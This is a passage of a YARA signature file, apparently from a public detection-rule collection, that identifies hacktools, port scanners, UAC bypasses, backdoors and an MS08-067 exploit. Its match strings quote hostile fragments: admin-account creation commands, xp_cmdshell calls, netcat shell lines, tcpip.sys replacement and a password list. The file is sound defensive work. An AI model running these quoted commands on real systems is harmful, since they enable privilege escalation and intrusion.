		$s2 = "m3hm3t_rullaz"
		$s3 = "7Projectc1"
		$s4 = "Ten-GGl\""
		$s5 = "/Moziqlxa"
	condition:
		all of them
}

rule portscan {
	meta:
		description = "Auto-generated rule on file portscan.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "a8bfdb2a925e89a281956b1e3bb32348"
	strings:
		$s5 = "0    :SCAN BEGUN ON PORT:"
		$s6 = "0    :PORTSCAN READY."
	condition:
		all of them
}

rule ProPort_zip_Folder_ProPort {
	meta:
		description = "Auto-generated rule on file ProPort.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "c1937a86939d4d12d10fc44b7ab9ab27"
	strings:
		$s0 = "Corrupt Data!"
		$s1 = "K4p~omkIz"
		$s2 = "DllTrojanScan"
		$s3 = "GetDllInfo"
		$s4 = "Compressed by Petite (c)1999 Ian Luck."
		$s5 = "GetFileCRC32"
		$s6 = "GetTrojanNumber"
		$s7 = "TFAKAbout"
	condition:
		all of them
}

rule StealthWasp_s_Basic_PortScanner_v1_2 {
	meta:
		description = "Auto-generated rule on file StealthWasp's Basic PortScanner v1.2.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "7c0f2cab134534cd35964fe4c6a1ff00"
	strings:
		$s1 = "Basic PortScanner"
		$s6 = "Now scanning port:"
	condition:
		all of them
}

rule BluesPortScan {
	meta:
		description = "Auto-generated rule on file BluesPortScan.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "6292f5fc737511f91af5e35643fc9eef"
	strings:
		$s0 = "This program was made by Volker Voss"
		$s1 = "JiBOo~SSB"
	condition:
		all of them
}

rule scanarator_iis {
	meta:
		description = "Auto-generated rule on file iis.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "3a8fc02c62c8dd65e038cc03e5451b6e"
	strings:
		$s0 = "example: iis 10.10.10.10"
		$s1 = "send error"
	condition:
		all of them
}

rule stealth_Stealth {
	meta:
		description = "Auto-generated rule on file Stealth.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "8ce3a386ce0eae10fc2ce0177bbc8ffa"
	strings:
		$s3 = "<table width=\"60%\" bgcolor=\"black\" cellspacing=\"0\" cellpadding=\"2\" border=\"1\" bordercolor=\"white\"><tr><td>"
		$s6 = "This tool may be used only by system administrators. I am not responsible for "
	condition:
		all of them
}

rule Angry_IP_Scanner_v2_08_ipscan {
	meta:
		description = "Auto-generated rule on file ipscan.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "70cf2c09776a29c3e837cb79d291514a"
	strings:
		$s0 = "_H/EnumDisplay/"
		$s5 = "ECTED.MSVCRT0x"
		$s8 = "NotSupported7"
	condition:
		all of them
}

rule crack_Loader {
	meta:
		description = "Auto-generated rule on file Loader.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "f4f79358a6c600c1f0ba1f7e4879a16d"
	strings:
		$s0 = "NeoWait.exe"
		$s1 = "RRRRRRRW"
	condition:
		all of them
}

rule CN_GUI_Scanner {
	meta:
		description = "Detects an unknown GUI scanner tool - CN background"
		author = "Florian Roth"
		hash = "3c67bbb1911cdaef5e675c56145e1112"
		score = 65
		date = "04.10.2014"
	strings:
		$s1 = "good.txt" fullword ascii
		$s2 = "IP.txt" fullword ascii
		$s3 = "xiaoyuer" fullword ascii
		$s0w = "ssh(" fullword wide
		$s1w = ").exe" fullword wide
	condition:
		all of them
}

rule CN_Packed_Scanner {
	meta:
		description = "Suspiciously packed executable"
		author = "Florian Roth"
		hash = "6323b51c116a77e3fba98f7bb7ff4ac6"
		score = 40
		date = "06.10.2014"
	strings:
		$s1 = "kernel32.dll" fullword ascii
		$s2 = "CRTDLL.DLL" fullword ascii
		$s3 = "__GetMainArgs" fullword ascii
		$s4 = "WS2_32.DLL" fullword ascii
	condition:
		all of them and filesize < 180KB and filesize > 70KB
}

rule Tiny_Network_Tool_Generic {
	meta:
		description = "Tiny tool with suspicious function imports. (Rule based on WinEggDrop Scanner samples)"
		author = "Florian Roth"
		date = "08.10.2014"
		score = 40
		type = "file"
		hash0 = "9e1ab25a937f39ed8b031cd8cfbc4c07"
		hash1 = "cafc31d39c1e4721af3ba519759884b9"
		hash2 = "8e635b9a1e5aa5ef84bfa619bd2a1f92"
	strings:
		$magic	= { 4d 5a }

		$s0 = "KERNEL32.DLL" fullword ascii
		$s1 = "CRTDLL.DLL" fullword ascii
		$s3 = "LoadLibmalware_raryA" fullword ascii
		$s4 = "GetProcAddress" fullword ascii

		$y1 = "WININET.DLL" fullword ascii
		$y2 = "atoi" fullword ascii

		$x1 = "ADVAPI32.DLL" fullword ascii
		$x2 = "USER32.DLL" fullword ascii
		$x3 = "wsock32.dll" fullword ascii
		$x4 = "FreeSid" fullword ascii
		$x5 = "atoi" fullword ascii

		$z1 = "ADVAPI32.DLL" fullword ascii
		$z2 = "USER32.DLL" fullword ascii
		$z3 = "FreeSid" fullword ascii
		$z4 = "ToAscii" fullword ascii

	condition:
		( $magic at 0 ) and all of ($s*) and ( all of ($y*) or all of ($x*) or all of ($z*) ) and filesize < 15KB
}

rule Beastdoor_Backdoor {
	meta:
		description = "Detects the backdoor Beastdoor"
		author = "Florian Roth"
		score = 55
		hash = "5ab10dda548cb821d7c15ebcd0a9f1ec6ef1a14abcc8ad4056944d060c49535a"
	strings:
		$s0 = "Redirect SPort RemoteHost RPort  -->Port Redirector" fullword
		$s1 = "POST /scripts/WWPMsg.dll HTTP/1.0" fullword
		$s2 = "http://IP/a.exe a.exe            -->Download A File" fullword
		$s7 = "Host: wwp.mirabilis.com:80" fullword
		$s8 = "%s -Set Port PortNumber              -->Set The Service Port" fullword
		$s11 = "Shell                            -->Get A Shell" fullword
		$s14 = "DeleteService ServiceName        -->Delete A Service" fullword
		$s15 = "Getting The UserName(%c%s%c)-->ID(0x%s) Successfully" fullword
		$s17 = "%s -Set ServiceName ServiceName      -->Set The Service Name" fullword
	condition:
		2 of them
}

rule Powershell_Netcat {
	meta:
		description = "Detects a Powershell version of the Netcat network hacking tool"
		author = "Florian Roth"
		score = 60
		date = "10.10.2014"
	strings:
		$s0 = "[ValidateRange(1, 65535)]" fullword
		$s1 = "$Client = New-Object -TypeName System.Net.Sockets.TcpClient" fullword
		$s2 = "$Buffer = New-Object -TypeName System.Byte[] -ArgumentList $Client.ReceiveBufferSize" fullword
	condition:
		all of them
}

rule Chinese_Hacktool_1014 {
	meta:
		description = "Detects a chinese hacktool with unknown use"
		author = "Florian Roth"
		score = 60
		date = "10.10.2014"
		hash = "98c07a62f7f0842bcdbf941170f34990"
	strings:
		$s0 = "IEXT2_IDC_HORZLINEMOVECURSOR" fullword wide
		$s1 = "msctls_progress32" fullword wide
		$s2 = "Reply-To: %s" fullword ascii
		$s3 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" fullword ascii
		$s4 = "html htm htx asp" fullword ascii
	condition:
		all of them
}

rule CN_Hacktool_BAT_PortsOpen {
	meta:
		description = "Detects a chinese BAT hacktool for local port evaluation"
		author = "Florian Roth"
		score = 60
		date = "12.10.2014"
	strings:
		$s0 = "for /f \"skip=4 tokens=2,5\" %%a in ('netstat -ano -p TCP') do (" ascii
		$s1 = "in ('tasklist /fi \"PID eq %%b\" /FO CSV') do " ascii
		$s2 = "@echo off" ascii
	condition:
		all of them
}

rule CN_Hacktool_SSPort_Portscanner {
	meta:
		description = "Detects a chinese Portscanner named SSPort"
		author = "Florian Roth"
		score = 70
		date = "12.10.2014"
	strings:
		$s0 = "Golden Fox" fullword wide
		$s1 = "Syn Scan Port" fullword wide
		$s2 = "CZ88.NET" fullword wide
	condition:
		all of them
}

rule CN_Hacktool_ScanPort_Portscanner {
	meta:
		description = "Detects a chinese Portscanner named ScanPort"
		author = "Florian Roth"
		score = 70
		date = "12.10.2014"
	strings:
		$s0 = "LScanPort" fullword wide
		$s1 = "LScanPort Microsoft" fullword wide
		$s2 = "www.yupsoft.com" fullword wide
	condition:
		all of them
}

rule CN_Hacktool_S_EXE_Portscanner {
	meta:
		description = "Detects a chinese Portscanner named s.exe"
		author = "Florian Roth"
		score = 70
		date = "12.10.2014"
	strings:
		$s0 = "\\Result.txt" fullword ascii
		$s1 = "By:ZT QQ:376789051" fullword ascii
		$s2 = "(http://www.eyuyan.com)" fullword wide
	condition:
		all of them
}

rule CN_Hacktool_MilkT_BAT {
	meta:
		description = "Detects a chinese Portscanner named MilkT - shipped BAT"
		author = "Florian Roth"
		score = 70
		date = "12.10.2014"
	strings:
		$s0 = "for /f \"eol=P tokens=1 delims= \" %%i in (s1.txt) do echo %%i>>s2.txt" ascii
		$s1 = "if not \"%Choice%\"==\"\" set Choice=%Choice:~0,1%" ascii
	condition:
		all of them
}

rule CN_Hacktool_MilkT_Scanner {
	meta:
		description = "Detects a chinese Portscanner named MilkT"
		author = "Florian Roth"
		score = 60
		date = "12.10.2014"
	strings:
		$s0 = "Bf **************" ascii fullword
		$s1 = "forming Time: %d/" ascii
		$s2 = "KERNEL32.DLL" ascii fullword
		$s3 = "CRTDLL.DLL" ascii fullword
		$s4 = "WS2_32.DLL" ascii fullword
		$s5 = "GetProcAddress" ascii fullword
		$s6 = "atoi" ascii fullword
	condition:
		all of them
}

rule CN_Hacktool_1433_Scanner {
	meta:
		description = "Detects a chinese MSSQL scanner"
		author = "Florian Roth"
		score = 40
		date = "12.10.2014"
	strings:
		$magic = { 4d 5a }
		$s0 = "1433" wide fullword
		$s1 = "1433V" wide
		$s2 = "del Weak1.txt" ascii fullword
		$s3 = "del Attack.txt" ascii fullword
		$s4 = "del /s /Q C:\\Windows\\system32\\doors\\" fullword ascii
		$s5 = "!&start iexplore http://www.crsky.com/soft/4818.html)" fullword ascii
	condition:
		( $magic at 0 ) and all of ($s*)
}

rule CN_Hacktool_1433_Scanner_Comp2 {
	meta:
		description = "Detects a chinese MSSQL scanner - component 2"
		author = "Florian Roth"
		score = 40
		date = "12.10.2014"
	strings:
		$magic = { 4d 5a }
		$s0 = "1433" wide fullword
		$s1 = "1433V" wide
		$s2 = "UUUMUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUMUUU" ascii fullword
	condition:
		( $magic at 0 ) and all of ($s*)
}

rule WCE_Modified_1_1014 {
	meta:
		description = "Modified (packed) version of Windows Credential Editor"
		author = "Florian Roth"
		hash = "09a412ac3c85cedce2642a19e99d8f903a2e0354"
		score = 70
	strings:
		$s0 = "LSASS.EXE" fullword ascii
		$s1 = "_CREDS" ascii
		$s9 = "Using WCE " ascii
	condition:
		all of them
}

rule ReactOS_cmd_valid {
	meta:
		description = "ReactOS cmd.exe with correct file name - maybe packed with software or part of hacker toolset"
		author = "Florian Roth"
		date = "05.11.14"
		reference = "http://www.elifulkerson.com/articles/suzy-sells-cmd-shells.php"
		score = 30
		hash = "b88f050fa69d85af3ff99af90a157435296cbb6e"
	strings:
		$s1 = "ReactOS Command Processor" fullword wide
		$s2 = "Copyright (C) 1994-1998 Tim Norman and others" fullword wide
		$s3 = "Eric Kohl and others" fullword wide
		$s4 = "ReactOS Operating System" fullword wide
	condition:
		all of ($s*)
}

rule iKAT_wmi_rundll {
	meta:
		description = "This exe will attempt to use WMI to Call the Win32_Process event to spawn rundll - file wmi_rundll.exe"
		author = "Florian Roth"
		date = "05.11.14"
		score = 65
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		hash = "97c4d4e6a644eed5aa12437805e39213e494d120"
	strings:
		$s0 = "This operating system is not supported." fullword ascii
		$s1 = "Error!" fullword ascii
		$s2 = "Win32 only!" fullword ascii
		$s3 = "COMCTL32.dll" fullword ascii
		$s4 = "[LordPE]" ascii
		$s5 = "CRTDLL.dll" fullword ascii
		$s6 = "VBScript" fullword ascii
		$s7 = "CoUninitialize" fullword ascii
	condition:
		all of them and filesize < 15KB
}

rule iKAT_revelations {
	meta:
		description = "iKAT hack tool showing the content of password fields - file revelations.exe"
		author = "Florian Roth"
		date = "05.11.14"
		score = 75
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		hash = "c4e217a8f2a2433297961561c5926cbd522f7996"
	strings:
		$s0 = "The RevelationHelper.DLL file is corrupt or missing." fullword ascii
		$s8 = "BETAsupport@snadboy.com" fullword wide
		$s9 = "support@snadboy.com" fullword wide
		$s14 = "RevelationHelper.dll" fullword ascii
	condition:
		all of them
}

rule iKAT_priv_esc_tasksch {
	meta:
		description = "Task Schedulder Local Exploit - Windows local priv-esc using Task Scheduler, published by webDevil. Supports Windows 7 and Vista."
		author = "Florian Roth"
		date = "05.11.14"
		score = 75
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		hash = "84ab94bff7abf10ffe4446ff280f071f9702cf8b"
	strings:
		$s0 = "objShell.Run \"schtasks /change /TN wDw00t /disable\",,True" fullword ascii
		$s3 = "objShell.Run \"schtasks /run /TN wDw00t\",,True" fullword ascii
		$s4 = "'objShell.Run \"cmd /c copy C:\\windows\\system32\\tasks\\wDw00t .\",,True" fullword ascii
		$s6 = "a.WriteLine (\"schtasks /delete /f /TN wDw00t\")" fullword ascii
		$s7 = "a.WriteLine (\"net user /add ikat ikat\")" fullword ascii
		$s8 = "a.WriteLine (\"cmd.exe\")" fullword ascii
		$s9 = "strFileName=\"C:\\windows\\system32\\tasks\\wDw00t\"" fullword ascii
		$s10 = "For n = 1 To (Len (hexXML) - 1) step 2" fullword ascii
		$s13 = "output.writeline \" Should work on Vista/Win7/2008 x86/x64\"" fullword ascii
		$s11 = "Set objExecObject = objShell.Exec(\"cmd /c schtasks /query /XML /TN wDw00t\")" fullword ascii
		$s12 = "objShell.Run \"schtasks /create /TN wDw00t /sc monthly /tr \"\"\"+biatchFile+\"" ascii
		$s14 = "a.WriteLine (\"net localgroup administrators /add v4l\")" fullword ascii
		$s20 = "Set ts = fso.createtextfile (\"wDw00t.xml\")" fullword ascii
	condition:
		2 of them
}

rule iKAT_command_lines_agent {
	meta:
		description = "iKAT hack tools set agent - file ikat.exe"
		author = "Florian Roth"
		date = "05.11.14"
		score = 75
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		hash = "c802ee1e49c0eae2a3fc22d2e82589d857f96d94"
	strings:
		$s0 = "Extended Module: super mario brothers" fullword ascii
		$s1 = "Extended Module: " fullword ascii
		$s3 = "ofpurenostalgicfeeling" fullword ascii
		$s8 = "-supermariobrotheretic" fullword ascii
		$s9 = "!http://132.147.96.202:80" fullword ascii
		$s12 = "iKAT Exe Template" fullword ascii
		$s15 = "withadancyflavour.." fullword ascii
		$s16 = "FastTracker v2.00   " fullword ascii
	condition:
		4 of them
}

rule iKAT_cmd_as_dll {
	meta:
		description = "iKAT toolset file cmd.dll ReactOS file cloaked"
		author = "Florian Roth"
		date = "05.11.14"
		score = 65
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		hash = "b5d0ba941efbc3b5c97fe70f70c14b2050b8336a"
	strings:
		$s1 = "cmd.exe" fullword wide
		$s2 = "ReactOS Development Team" fullword wide
		$s3 = "ReactOS Command Processor" fullword wide

		$ext = "extension: .dll" nocase
	condition:
		all of ($s*) and $ext
}

rule iKAT_tools_nmap {
	meta:
		description = "Generic rule for NMAP - based on NMAP 4 standalone"
		author = "Florian Roth"
		date = "05.11.14"
		score = 50
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		hash = "d0543f365df61e6ebb5e345943577cc40fca8682"
	strings:
		$s0 = "Insecure.Org" fullword wide
		$s1 = "Copyright (c) Insecure.Com" fullword wide
		$s2 = "nmap" fullword nocase
		$s3 = "Are you alert enough to be using Nmap?  Have some coffee or Jolt(tm)." ascii
	condition:
		all of them
}

rule iKAT_startbar {
	meta:
		description = "Tool to hide unhide the windows startbar from command line - iKAT hack tools - file startbar.exe"
		author = "Florian Roth"
		date = "05.11.14"
		score = 50
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		hash = "0cac59b80b5427a8780168e1b85c540efffaf74f"
	strings:
		$s2 = "Shinysoft Limited1" fullword ascii
		$s3 = "Shinysoft Limited0" fullword ascii
		$s4 = "Wellington1" fullword ascii
		$s6 = "Wainuiomata1" fullword ascii
		$s8 = "56 Wright St1" fullword ascii
		$s9 = "UTN-USERFirst-Object" fullword ascii
		$s10 = "New Zealand1" fullword ascii
	condition:
		all of them
}

rule iKAT_gpdisable_customcmd_kitrap0d_uacpoc {
	meta:
		description = "iKAT hack tool set generic rule - from files gpdisable.exe, customcmd.exe, kitrap0d.exe, uacpoc.exe"
		author = "Florian Roth"
		date = "05.11.14"
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		super_rule = 1
		hash0 = "814c126f21bc5e993499f0c4e15b280bf7c1c77f"
		hash1 = "2725690954c2ad61f5443eb9eec5bd16ab320014"
		hash2 = "75f5aed1e719443a710b70f2004f34b2fe30f2a9"
		hash3 = "b65a460d015fd94830d55e8eeaf6222321e12349"
		score = 20
	strings:
		$s0 = "Failed to get temp file for source AES decryption" fullword
		$s5 = "Failed to get encryption header for pwd-protect" fullword
		$s17 = "Failed to get filetime" fullword
		$s20 = "Failed to delete temp file for password decoding (3)" fullword
	condition:
		all of them
}

rule iKAT_Tool_Generic {
	meta:
		description = "Generic Rule for hack tool iKAT files gpdisable.exe, kitrap0d.exe, uacpoc.exe"
		author = "Florian Roth"
		date = "05.11.14"
		score = 55
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		super_rule = 1
		hash0 = "814c126f21bc5e993499f0c4e15b280bf7c1c77f"
		hash1 = "75f5aed1e719443a710b70f2004f34b2fe30f2a9"
		hash2 = "b65a460d015fd94830d55e8eeaf6222321e12349"
	strings:
		$s0 = "<IconFile>C:\\WINDOWS\\App.ico</IconFile>" fullword
		$s1 = "Failed to read the entire file" fullword
		$s4 = "<VersionCreatedBy>14.4.0</VersionCreatedBy>" fullword
		$s8 = "<ProgressCaption>Run &quot;executor.bat&quot; once the shell has spawned.</P"
		$s9 = "Running Zip pipeline..." fullword
		$s10 = "<FinTitle />" fullword
		$s12 = "<AutoTemp>0</AutoTemp>" fullword
		$s14 = "<DefaultDir>%TEMP%</DefaultDir>" fullword
		$s15 = "AES Encrypting..." fullword
		$s20 = "<UnzipDir>%TEMP%</UnzipDir>" fullword
	condition:
		all of them
}

rule BypassUac2 {
	meta:
		description = "Auto-generated rule - file BypassUac2.zip"
		author = "yarGen Yara Rule Generator"
		hash = "ef3e7dd2d1384ecec1a37254303959a43695df61"
	strings:
		$s0 = "/BypassUac/BypassUac/BypassUac_Utils.cpp" fullword ascii
		$s1 = "/BypassUac/BypassUacDll/BypassUacDll.aps" fullword ascii
		$s3 = "/BypassUac/BypassUac/BypassUac.ico" fullword ascii
	condition:
		all of them
}

rule BypassUac_3 {
	meta:
		description = "Auto-generated rule - file BypassUacDll.dll"
		author = "yarGen Yara Rule Generator"
		hash = "1974aacd0ed987119999735cad8413031115ce35"
	strings:
		$s0 = "BypassUacDLL.dll" fullword wide
		$s1 = "\\Release\\BypassUacDll" ascii
		$s3 = "Win7ElevateDLL" fullword wide
		$s7 = "BypassUacDLL" fullword wide
	condition:
		3 of them
}

rule BypassUac_9 {
	meta:
		description = "Auto-generated rule - file BypassUac.zip"
		author = "yarGen Yara Rule Generator"
		hash = "93c2375b2e4f75fc780553600fbdfd3cb344e69d"
	strings:
		$s0 = "/x86/BypassUac.exe" fullword ascii
		$s1 = "/x64/BypassUac.exe" fullword ascii
		$s2 = "/x86/BypassUacDll.dll" fullword ascii
		$s3 = "/x64/BypassUacDll.dll" fullword ascii
		$s15 = "BypassUac" fullword ascii
	condition:
		all of them
}

rule BypassUacDll_6 {
	meta:
		description = "Auto-generated rule - file BypassUacDll.aps"
		author = "yarGen Yara Rule Generator"
		hash = "58d7b24b6870cb7f1ec4807d2f77dd984077e531"
	strings:
		$s3 = "BypassUacDLL.dll" fullword wide
		$s4 = "AFX_IDP_COMMAND_FAILURE" fullword ascii
	condition:
		all of them
}

rule BypassUacDll_7 {
	meta:
		description = "Auto-generated rule - file BypassUacDll.aps"
		author = "yarGen Yara Rule Generator"
		hash = "58d7b24b6870cb7f1ec4807d2f77dd984077e531"
	strings:
		$s3 = "BypassUacDLL.dll" fullword wide
		$s4 = "AFX_IDP_COMMAND_FAILURE" fullword ascii
	condition:
		all of them
}

rule BypassUac_EXE {
	meta:
		description = "Auto-generated rule - file BypassUacDll.aps"
		author = "yarGen Yara Rule Generator"
		hash = "58d7b24b6870cb7f1ec4807d2f77dd984077e531"
	strings:
		$s1 = "Wole32.dll" wide
		$s3 = "System32\\migwiz" wide
		$s4 = "System32\\migwiz\\CRYPTBASE.dll" wide
		$s5 = "Elevation:Administrator!new:" wide
		$s6 = "BypassUac" wide
	condition:
		all of them
}

rule APT_Proxy_Malware_Packed_dev
{
	meta:
		author = "FRoth"
		date = "2014-11-10"
		description = "APT Malware - Proxy"
		hash = "6b6a86ceeab64a6cb273debfa82aec58"
		score = 50
	strings:
		$string0 = "PECompact2" fullword
		$string1 = "[LordPE]"
		$string2 = "steam_ker.dll"
	condition:
		all of them
}

rule Tzddos_DDoS_Tool_CN {
	meta:
		description = "Disclosed hacktool set - file tzddos"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "d4c517eda5458247edae59309453e0ae7d812f8e"
	strings:
		$s0 = "for /f %%a in (host.txt) do (" fullword ascii
		$s1 = "for /f \"eol=S tokens=1 delims= \" %%i in (s2.txt) do echo %%i>>host.txt" fullword ascii
		$s2 = "del host.txt /q" fullword ascii
		$s3 = "for /f \"eol=- tokens=1 delims= \" %%i in (result.txt) do echo %%i>>s1.txt" fullword ascii
		$s4 = "start Http.exe %%a %http%" fullword ascii
		$s5 = "for /f \"eol=P tokens=1 delims= \" %%i in (s1.txt) do echo %%i>>s2.txt" fullword ascii
		$s6 = "del Result.txt s2.txt s1.txt " fullword ascii
	condition:
		all of them
}

rule Ncat_Hacktools_CN {
	meta:
		description = "Disclosed hacktool set - file nc.exe"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "001c0c01c96fa56216159f83f6f298755366e528"
	strings:
		$s0 = "nc -l -p port [options] [hostname] [port]" fullword ascii
		$s2 = "nc [-options] hostname port[s] [ports] ... " fullword ascii
		$s3 = "gethostpoop fuxored" fullword ascii
		$s6 = "VERNOTSUPPORTED" fullword ascii
		$s7 = "%s [%s] %d (%s)" fullword ascii
		$s12 = " `--%s' doesn't allow an argument" fullword ascii
	condition:
		all of them
}

rule MS08_067_Exploit_Hacktools_CN {
	meta:
		description = "Disclosed hacktool set - file cs.exe"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "a3e9e0655447494253a1a60dbc763d9661181322"
	strings:
		$s0 = "MS08-067 Exploit for CN by EMM@ph4nt0m.org" fullword ascii
		$s3 = "Make SMB Connection error:%d" fullword ascii
		$s5 = "Send Payload Over!" fullword ascii
		$s7 = "Maybe Patched!" fullword ascii
		$s8 = "RpcExceptionCode() = %u" fullword ascii
		$s11 = "ph4nt0m" fullword wide
		$s12 = "\\\\%s\\IPC" ascii
	condition:
		4 of them
}

rule Hacktools_CN_Burst_sql {
	meta:
		description = "Disclosed hacktool set - file sql.exe"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "d5139b865e99b7a276af7ae11b14096adb928245"
	strings:
		$s0 = "s.exe %s %s %s %s %d /save" fullword ascii
		$s2 = "s.exe start error...%d" fullword ascii
		$s4 = "EXEC sp_addextendedproc xp_cmdshell,'xplog70.dll'" fullword ascii
		$s7 = "EXEC master..xp_cmdshell 'wscript.exe cc.js'" fullword ascii
		$s10 = "Result.txt" fullword ascii
		$s11 = "Usage:sql.exe [options]" fullword ascii
		$s17 = "%s root %s %d error" fullword ascii
		$s18 = "Pass.txt" fullword ascii
		$s20 = "SELECT sillyr_at_gmail_dot_com INTO DUMPFILE '%s\\\\sillyr_x.so' FROM sillyr_x" fullword ascii
	condition:
		6 of them
}

rule Hacktools_CN_Panda_445TOOL {
	meta:
		description = "Disclosed hacktool set - file 445TOOL.malware_rar"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "92050ba43029f914696289598cf3b18e34457a11"
	strings:
		$s0 = "scan.bat" fullword ascii
		$s1 = "Http.exe" fullword ascii
		$s2 = "GOGOGO.bat" fullword ascii
		$s3 = "ip.txt" fullword ascii
	condition:
		all of them
}

rule Hacktools_CN_Panda_445 {
	meta:
		description = "Disclosed hacktool set - file 445.malware_rar"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "a61316578bcbde66f39d88e7fc113c134b5b966b"
	strings:
		$s0 = "for /f %%i in (ips.txt) do (start cmd.bat %%i)" fullword ascii
		$s1 = "445\\nc.exe" fullword ascii
		$s2 = "445\\s.exe" fullword ascii
		$s3 = "cs.exe %1" fullword ascii
		$s4 = "445\\cs.exe" fullword ascii
		$s5 = "445\\ip.txt" fullword ascii
		$s6 = "445\\cmd.bat" fullword ascii
		$s9 = "@echo off" fullword ascii
	condition:
		all of them
}

rule Hacktools_CN_WinEggDrop {
	meta:
		description = "Disclosed hacktool set - file s.exe"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "7665011742ce01f57e8dc0a85d35ec556035145d"
	strings:
		$s0 = "Normal Scan: About To Scan %u IP For %u Ports Using %d Thread" fullword ascii
		$s2 = "SYN Scan: About To Scan %u IP For %u Ports Using %d Thread" fullword ascii
		$s6 = "Example: %s TCP 12.12.12.12 12.12.12.254 21 512 /Banner" fullword ascii
		$s8 = "Something Wrong About The Ports" fullword ascii
		$s9 = "Performing Time: %d/%d/%d %d:%d:%d --> " fullword ascii
		$s10 = "Example: %s TCP 12.12.12.12/24 80 512 /T8 /Save" fullword ascii
		$s12 = "%u Ports Scanned.Taking %d Threads " fullword ascii
		$s13 = "%-16s %-5d -> \"%s\"" fullword ascii
		$s14 = "SYN Scan Can Only Perform On WIN 2K Or Above" fullword ascii
		$s17 = "SYN Scan: About To Scan %s:%d Using %d Thread" fullword ascii
		$s18 = "Scan %s Complete In %d Hours %d Minutes %d Seconds. Found %u Open Ports" fullword ascii
	condition:
		5 of them
}

rule Hacktools_CN_Scan_BAT {
	meta:
		description = "Disclosed hacktool set - file scan.bat"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "6517d7c245f1300e42f7354b0fe5d9666e5ce52a"
	strings:
		$s0 = "for /f %%a in (host.txt) do (" fullword ascii
		$s1 = "for /f \"eol=S tokens=1 delims= \" %%i in (s2.txt) do echo %%i>>host.txt" fullword ascii
		$s2 = "del host.txt /q" fullword ascii
		$s3 = "for /f \"eol=- tokens=1 delims= \" %%i in (result.txt) do echo %%i>>s1.txt" fullword ascii
		$s4 = "start Http.exe %%a %http%" fullword ascii
		$s5 = "for /f \"eol=P tokens=1 delims= \" %%i in (s1.txt) do echo %%i>>s2.txt" fullword ascii
	condition:
		5 of them
}

rule Hacktools_CN_Panda_Burst {
	meta:
		description = "Disclosed hacktool set - file Burst.malware_rar"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "ce8e3d95f89fb887d284015ff2953dbdb1f16776"
	strings:
		$s0 = "@sql.exe -f ip.txt -m syn -t 3306 -c 5000 -u http://60.15.124.106:63389/tasksvr." ascii
	condition:
		all of them
}

rule Hacktools_CN_445_cmd {
	meta:
		description = "Disclosed hacktool set - file cmd.bat"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "69b105a3aec3234819868c1a913772c40c6b727a"
	strings:
		$bat = "@echo off" fullword ascii
		$s0 = "cs.exe %1" fullword ascii
		$s2 = "nc %1 4444" fullword ascii
	condition:
		$bat at 0 and all of ($s*)
}

rule Hacktools_CN_GOGOGO_Bat {
	meta:
		description = "Disclosed hacktool set - file GOGOGO.bat"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "4bd4f5b070acf7fe70460d7eefb3623366074bbd"
	strings:
		$s0 = "for /f \"delims=\" %%x in (endend.txt) do call :lisoob %%x" fullword ascii
		$s1 = "http://www.tzddos.com/ -------------------------------------------->byebye.txt" fullword ascii
		$s2 = "ren %systemroot%\\system32\\drivers\\tcpip.sys tcpip.sys.bak" fullword ascii
		$s4 = "IF /I \"%wangle%\"==\"\" ( goto start ) else ( goto erromm )" fullword ascii
		$s5 = "copy *.tzddos scan.bat&del *.tzddos" fullword ascii
		$s6 = "del /f tcpip.sys" fullword ascii
		$s9 = "if /i \"%CB%\"==\"www.tzddos.com\" ( goto mmbat ) else ( goto wangle )" fullword ascii
		$s10 = "call scan.bat" fullword ascii
		$s12 = "IF /I \"%erromm%\"==\"\" ( goto start ) else ( goto zuihoujh )" fullword ascii
		$s13 = "IF /I \"%zuihoujh%\"==\"\" ( goto start ) else ( goto laji )" fullword ascii
		$s18 = "sc config LmHosts start= auto" fullword ascii
		$s19 = "copy tcpip.sys %systemroot%\\system32\\drivers\\tcpip.sys > nul" fullword ascii
		$s20 = "ren %systemroot%\\system32\\dllcache\\tcpip.sys tcpip.sys.bak" fullword ascii
	condition:
		3 of them
}

rule Hacktools_CN_Burst_pass {
	meta:
		description = "Disclosed hacktool set - file pass.txt"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "55a05cf93dbd274355d798534be471dff26803f9"
	strings:
		$s0 = "123456.com" fullword ascii
		$s1 = "123123.com" fullword ascii
		$s2 = "360.com" fullword ascii
		$s3 = "123.com" fullword ascii
		$s4 = "juso.com" fullword ascii
		$s5 = "sina.com" fullword ascii
		$s7 = "changeme" fullword ascii
		$s8 = "master" fullword ascii
		$s9 = "google.com" fullword ascii
		$s10 = "chinanet" fullword ascii
